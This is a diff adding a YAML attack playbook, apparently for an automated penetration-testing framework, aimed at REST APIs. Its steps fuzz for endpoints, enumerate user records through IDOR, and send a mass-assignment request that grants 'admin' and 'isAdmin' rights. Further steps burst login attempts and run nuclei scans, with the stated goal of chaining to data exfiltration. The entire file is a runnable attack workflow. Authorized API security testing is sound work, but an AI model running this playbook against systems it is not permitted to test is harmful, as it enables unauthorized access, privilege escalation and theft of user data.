@@ -1,0 +1,79 @@
+name: "REST API Abuse & Broken Object Authorization"
+description: "Enumerate API endpoints, test for broken object-level authorization (BOLA/IDOR), mass assignment, and rate-limit bypass, then chain to data exfiltration."
+category: web
+attack_vector: "API enumeration → BOLA/IDOR → mass assignment → data exfiltration"
+variables:
+  url:
+    required: true
+    description: "Target API base URL (e.g. http://host/api)"
+cutting_edge: true
+references: ["OWASP API Security Top 10", "BOLA/IDOR testing methodology"]
+
+steps:
+  - name: "api_endpoint_enum"
+    tool: "ffuf_fuzz"
+    description: "Enumerate API endpoints and versions (/v1, /v2, /users, /admin)"
+    args:
+      url: "{{url}}/FUZZ"
+      wordlist: "/usr/share/seclists/Discovery/Web-Content/api-endpoints.txt"
+    expected_output: "Status: 200|Status: 401|Status: 403"
+    timeout: 300
+    gate: true
+    retries: 1
+
+  - name: "idor_test"
+    tool: "curl_request"
+    description: "Test for IDOR by incrementing object IDs (sequential enumeration)"
+    args:
+      url: "{{url}}/users/1"
+      method: "GET"
+      follow_redirects: true
+      insecure: true
+    expected_output: "200|id|email|username"
+    timeout: 60
+    gate: false
+    retries: 1
+    extracts:
+      - var: "user_id"
+        regex: "\"id\"\\s*:\\s*(\"?\\d+\"?)"
+
+  - name: "mass_assignment_probe"
+    tool: "curl_request"
+    description: "Probe mass assignment by adding privileged fields (isAdmin, role) to a create/update request"
+    args:
+      url: "{{url}}/users"
+      method: "POST"
+      headers: 'Content-Type: application/json'
+      data: '{"username": "test", "role": "admin", "isAdmin": true}'
+      follow_redirects: true
+      insecure: true
+    expected_output: null
+    timeout: 60
+    gate: false
+    retries: 0
+
+  - name: "rate_limit_test"
+    tool: "curl_request"
+    description: "Burst requests to detect missing rate limiting on auth endpoints"
+    args:
+      url: "{{url}}/login"
+      method: "POST"
+      headers: 'Content-Type: application/json'
+      data: '{"username": "admin", "password": "wrongpass"}'
+      follow_redirects: true
+      insecure: true
+    expected_output: null
+    timeout: 60
+    gate: false
+    retries: 0
+
+  - name: "nuclei_api_scan"
+    tool: "nuclei_scan"
+    description: "Run nuclei API misconfiguration templates"
+    args:
+      target: "{{url}}"
+      templates: "http/misconfiguration,http/exposures"
+    expected_output: null
+    timeout: 600
+    gate: false
+    retries: 0
